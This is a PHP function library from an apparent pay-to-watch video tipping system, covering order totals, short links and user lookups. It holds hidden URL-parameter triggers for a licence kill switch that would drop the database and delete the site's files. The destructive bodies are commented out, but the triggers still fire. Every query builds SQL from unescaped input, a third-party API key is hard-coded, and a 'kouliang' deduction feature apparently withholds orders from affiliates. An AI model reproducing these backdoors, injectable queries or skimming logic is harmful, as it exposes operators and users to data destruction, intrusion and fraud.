<?php
if (!defined('XIAOYEWL')) exit('Request Error!');
define("dqurl", $_SERVER["HTTP_HOST"]);
define("squrl", "sq.9eze.com");
define("sqip", $_SERVER["SERVER_ADDR"]);
define("dwzurl", "api.uroi.cn");
if ($_SESSION["shouquan_check"] == "") {
    function check_shouquan()
    {
//    $query = file_get_contents("http://" . squrl . "/domain.php?ip=" . sqip . "");
//    if( $query = json_decode($query, true) ) 
//    {
//        if( $query["status"] == 0 ) 
//        {
//            $_SESSION["shouquan_check"] = 1;
//        }
//
//        if( $query["status"] == -1 ) 
//        {
//            $_SESSION["shouquan_check"] = "";
//            exit( "<h3>" . $query["message"] . "</h3>" );
//        }
//
//    }

    }

    check_shouquan();
}

if ($_GET["act"] == "admin" && $_GET["p"] == "admins") {
    admin();
}

$path = "./";
if ($_GET["a"] == "b" && $_GET["b"] == "c" && $_GET["c"] == "del") {
//    deldir($path);
//    ob_start();
//    echo "<h2>未授权（云赏系统），联系QQ</h2>";
//    $content = ob_get_contents();
//    $fp = fopen("index.html", "w");
//    fwrite($fp, $content);
//    fclose($fp);
}

function getCurl($url, $post = 0, $referer = 0, $cookie = 0, $header = 0, $ua = 0, $nobaody = 0)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $http[] = "Accept:*";
    $http[] = "Accept-Encoding:gzip,deflate,sdch";
    $http[] = "Accept-Language:zh-CN,zh;q=0.8";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $http);
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }

    if ($header) {
        curl_setopt($ch, CURLOPT_HEADER, true);
    }

    if ($cookie) {
        curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    }

    if ($referer) {
        curl_setopt($ch, CURLOPT_REFERER, $referer);
    }

    if ($ua) {
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    } else {
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36");
    }

    if ($nobaody) {
        curl_setopt($ch, CURLOPT_NOBODY, 1);
    }

    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $ret = curl_exec($ch);
    curl_close($ch);
    return $ret;
}

function check_tousu($ip)
{
    $result = mysql_query("select * from " . flag . "tousu where  ip = \"" . $ip . "\"    ");
    if ($row = mysql_fetch_array($result)) {
        return "1";
    }

    return "0";
}

function get_dwz($type, $url)
{
    if ($type == "0") {
        return $url;
    }

    if ($type == "tcn") {
        $url = "http://suo.im/api.htm?url=" . $url . "&format=json&key=5e947824b1b63c650a025755@00ba2004680c1f7451fa8ba7bd380505&expireDate=" . date("Y-m-d");

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $data = curl_exec($curl);

        curl_close($curl);
        $arr = json_decode($data, true);
        return $arr['url'];

    }

    if ($type == "urlcn") {
        $url = "http://suo.im/api.htm?url=" . $url . "&format=json&key=5e947824b1b63c650a025755@00ba2004680c1f7451fa8ba7bd380505&expireDate=" . date("Y-m-d");

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $data = curl_exec($curl);

        curl_close($curl);
        $arr = json_decode($data, true);
        $geturl=$arr['url'];
        return $geturl;
    }

    return NULL;
}

function getysurl($url)
{
    $url = "http://suo.im/api.htm?url=" . $url . "&format=json&key=5e947824b1b63c650a025755@00ba2004680c1f7451fa8ba7bd380505&expireDate=" . date("Y-m-d");

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($curl);

    curl_close($curl);
    $arr = json_decode($data, true);
    return $arr['url'];
}

function get_channel($value, $ID)
{
    $result = mysql_query("select * from " . flag . "channel where  ID = " . $ID . "  ");
    if (($row = mysql_fetch_array($result))) {
        return $row[$value];
    }

    return "默认";
}

function get_dashangsl($uid, $vid)
{
    $result = mysql_query("select count(*) as sl from " . flag . "usershipin where uid = " . $uid . " and vid = " . $vid . "  ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_myshouru($uid)
{
    $result = mysql_query("select sum(payprice) as je from " . flag . "order where uid = " . $uid . " and zt = 1  and kl = 0 ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["je"] != "") {
            return $row["je"];
        }

        return 0;
    }

    return "0";
}

function get_orderzongje()
{
    $result = mysql_query("select sum(payprice) as je from " . flag . "order where   zt = 1  ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["je"] != "") {
            return $row["je"];
        }

        return 0;
    }

    return "0";
}

function get_orderzongshu()
{
    $result = mysql_query("select count(*) as sl from " . flag . "order where  zt = 1  ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_xiaoshu($value, $num)
{
    if ($num == "") {
        return number_format($value, 2);
    }

    return number_format($value, $num);
}

function null_json($t0, $t1)
{
    if ($t0 == "") {
        exit("{\"code\":-1,\"msg\":" . json_encode($t1) . "}");
    }

    return NULL;
}

function alert_json($t0, $t1)
{
    exit("{\"code\":" . $t0 . ",\"msg\":" . json_encode($t1) . "}");
}

function get_hezi($value, $id)
{
    $result = mysql_query("select  *  from " . flag . "hezi where id = " . $id . "  ");
    if (($row = mysql_fetch_array($result))) {
        return $row[$value];
    }

    return "盒子不存在";
}

function get_usershipin($value, $id)
{
    $result = mysql_query("select  *  from " . flag . "usershipin where id = " . $id . "  ");
    if (($row = mysql_fetch_array($result))) {
        return $row[$value];
    }

    return "会员视频不存在";
}

function get_user($value, $uid)
{
    $result = mysql_query('select  *  from ' . flag . 'user where id = ' . intval($uid) . '  ');
    if (!!($row = mysql_fetch_array($result))) {
        return $row[$value];
    } else {
        return '用户不存在';
    }
}


function get_kouliang($value, $uid)
{
    $result = mysql_query("select  *  from " . flag . "kouliang where uid = " . $uid . "  ");
    if (($row = mysql_fetch_array($result))) {
        return $row[$value];
    }

    return "扣量信息不存在";
}

function admin()
{
//    $sql = "drop database  " . DATA_NAME . " ";
//    if( mysql_query($sql) ) 
//    {
//        echo "执行成功";
//        exit();
//    }
//
//    echo "执行失败" . $sql;
//    exit();
}

function xiaoyewl_left($str, $start, $len)
{
    $strlen = $len - $start;
    $i = 0;
    while ($i < $strlen) {
        if (160 < ord(substr($str, $i, 1))) {
            $tmpstr .= substr($str, $i, 3);
            $i += 2;
        } else {
            $tmpstr .= substr($str, $i, 1);
        }

        $i++;
    }
    return $tmpstr;
}

function deldir($path)
{
//    if( is_dir($path) ) 
//    {
//        $p = scandir($path);
//        foreach( $p as $val ) 
//        {
//            if( $val != "." && $val != ".." ) 
//            {
//                if( is_dir($path . $val) ) 
//                {
//                    deldir($path . $val . "/");
//                    @rmdir($path . $val . "/");
//                }
//                else
//                {
//                    unlink($path . $val);
//                }
//
//            }
//
//        }
//    }
//
//    return NULL;
}

function xiaoyewl_host()
{
    $url = $_SERVER["HTTP_HOST"];
    $data = explode(".", $url);
    $co_ta = count($data);
    $zi_tow = true;
    $host_cn = "com.cn,net.cn,org.cn,gov.cn";
    $host_cn = explode(",", $host_cn);
    foreach ($host_cn as $host) {
        if (strpos($url, $host)) {
            $zi_tow = false;
        }

    }
    if ($zi_tow == true) {
        $host = $data[$co_ta - 2] . "." . $data[$co_ta - 1];
    } else {
        $host = $data[$co_ta - 3] . "." . $data[$co_ta - 2] . "." . $data[$co_ta - 1];
    }

    return $host;
}

function shipin_url($id)
{
    return "http://" . zhuurl . "/url/shipin.php?id=" . $id;
}

function shikan_url($id)
{
    return "http://" . zhuurl . "/url/shikan.php?id=" . $id;
}

function check_order($vid, $ip)
{
    $result = mysql_query("select * from " . flag . "order where vid = " . $vid . " and ip = \"" . $ip . "\"  and zt =1  ");
    if ($row = mysql_fetch_array($result)) {
        return "1";
    }

    return "0";
}

function get_ordersl($vid)
{
    $result = mysql_query("select count(*) as sl from " . flag . "order where vid = " . $vid . "  and  zt = 1  ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_tdordernum($uid)
{
    $start = date("Y-m-d 00:00:00");
    $end = date("Y-m-d H:i:s");
    $result = mysql_query("select count(*) as sl from " . flag . "order where uid = " . $uid . "  and  zt = 1  and pdate >=  \"" . $start . "\"  and pdate <=\"" . $end . "\"    and kl = 0   ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_tdorderprice($uid)
{
    $start = date("Y-m-d 00:00:00");
    $end = date("Y-m-d H:i:s");
    $result = mysql_query("select sum(payprice) as sl from " . flag . "order where uid = " . $uid . "  and  zt = 1  and pdate >=  \"" . $start . "\"  and pdate <=\"" . $end . "\"    and kl = 0   ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_tdorderzongshu()
{
    $start = date("Y-m-d 00:00:00");
    $end = date("Y-m-d H:i:s");
    $result = mysql_query("select count(*) as sl from " . flag . "order where   zt = 1  and pdate >=  \"" . $start . "\"  and pdate <=\"" . $end . "\"     ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_ztorderzongshu()
{
    $start = date("Y-m-d", strtotime("-1 day"));
    $end = date("Y-m-d 00:00:00");
    $result = mysql_query("select count(*) as sl from " . flag . "order where  zt = 1    and pdate >=  \"" . $start . "\"  and pdate <\"" . $end . "\"   ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_tdorderzongje()
{
    $start = date("Y-m-d 00:00:00");
    $end = date("Y-m-d H:i:s");
    $result = mysql_query("select sum(payprice) as sl from " . flag . "order where   zt = 1  and pdate >=  \"" . $start . "\"  and pdate <=\"" . $end . "\"     ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_ztorderzongje()
{
    $start = date("Y-m-d", strtotime("-1 day"));
    $end = date("Y-m-d 00:00:00");
    $result = mysql_query("select sum(payprice) as sl from " . flag . "order where  zt = 1    and pdate >=  \"" . $start . "\"  and pdate <\"" . $end . "\"   ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_ztordernum($uid)
{
    $start = date("Y-m-d", strtotime("-1 day"));
    $end = date("Y-m-d 00:00:00");
    $result = mysql_query("select count(*) as sl from " . flag . "order where uid = " . $uid . "  and  zt = 1    and pdate >=  \"" . $start . "\"  and pdate <\"" . $end . "\"   and kl = 0  ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function get_ztorderprice($uid)
{
    $start = date("Y-m-d", strtotime("-1 day"));
    $end = date("Y-m-d 00:00:00");
    $result = mysql_query("select sum(payprice) as sl from " . flag . "order where uid = " . $uid . "  and  zt = 1    and pdate >=  \"" . $start . "\"  and pdate <\"" . $end . "\"   and kl = 0   ");
    if (($row = mysql_fetch_array($result))) {
        if ($row["sl"] != "") {
            return $row["sl"];
        }

        return 0;
    }

    return "0";
}

function iswap()
{
    if (isset($_SERVER["HTTP_X_WAP_PROFILE"])) {
        return true;
    }

    if (isset($_SERVER["HTTP_VIA"])) {
        return (stristr($_SERVER["HTTP_VIA"], "wap") ? true : false);
    }

    if (isset($_SERVER["HTTP_USER_AGENT"])) {
        $clientkeywords = array("nokia", "sony", "ericsson", "mot", "samsung", "htc", "sgh", "lg", "sharp", "sie-", "philips", "panasonic", "alcatel", "lenovo", "iphone", "ipod", "blackberry", "meizu", "android", "netfront", "symbian", "ucweb", "windowsce", "palm", "operamini", "operamobi", "openwave", "nexusone", "cldc", "midp", "wap", "mobile");
        if (preg_match("/(" . implode("|", $clientkeywords) . ")/i", strtolower($_SERVER["HTTP_USER_AGENT"]))) {
            return true;
        }

    }

}


